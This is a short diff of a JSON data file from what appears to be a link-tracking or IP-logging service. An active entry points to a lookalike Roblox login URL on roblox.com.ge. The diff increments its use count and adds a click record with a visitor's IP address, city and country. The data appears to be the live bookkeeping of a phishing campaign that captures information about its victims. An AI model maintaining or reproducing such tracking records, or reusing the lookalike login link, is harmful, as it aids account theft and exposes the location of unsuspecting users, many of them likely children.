@@ -118,7 +118,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 998,
+    "useCount": 999,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8104,6 +8104,14 @@
         "city": "Brainerd",
         "flag": "🇺🇸",
         "countryCode": "US"
+      },
+      {
+        "timestamp": 1777222122081,
+        "ip": "217.35.238.255",
+        "country": "United Kingdom",
+        "city": "Sutton Coldfield",
+        "flag": "🇬🇧",
+        "countryCode": "GB"
       }
     ]
   },
